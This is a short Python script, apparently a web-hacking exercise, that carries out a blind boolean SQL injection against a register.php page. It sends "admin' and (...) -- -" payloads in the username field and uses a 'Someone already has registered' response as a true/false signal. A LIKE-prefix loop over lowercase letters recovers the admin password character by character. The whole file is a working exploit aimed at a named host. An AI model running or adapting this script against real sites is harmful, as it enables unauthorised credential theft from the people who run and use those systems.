# @author Melinda Sherrill
# Goes to website, exploits it by iterating through alphabe to get password
import requests


# Input the URL running the .php file that connects to db
BASEURL = "http://frechetta.me/WebHack/php/register.php"
SESSION = requests.Session()

# Look familar? go to the link above and see
TRUE = "Someone already has registered"


# Gets session url
def postURL(url, data):
    return SESSION.post(format(url), data).text


# Sends sql injection to the query listed in the php file
def evaluateCondition(cond):
    payload = "admin' and (%s) -- -" % cond
    response = postURL(BASEURL, {"username": payload})

    #print response
    return TRUE in response


# Loops SQL injection 'password LIKE y%' until password is found!
def exploitSQL():
    password = ""
    alphabet = "abcdefghijklmnopqrstuvwxyz"

    query = "password LIKE "
    passthrough = False
    while(not passthrough):
        for i in alphabet:
            format = "'" + password + i + "%" + "'"
            if evaluateCondition(query + format):
                password += i
                print True
                break
            if i == alphabet[-1]:
                passthrough = True
    return password

print exploitSQL()
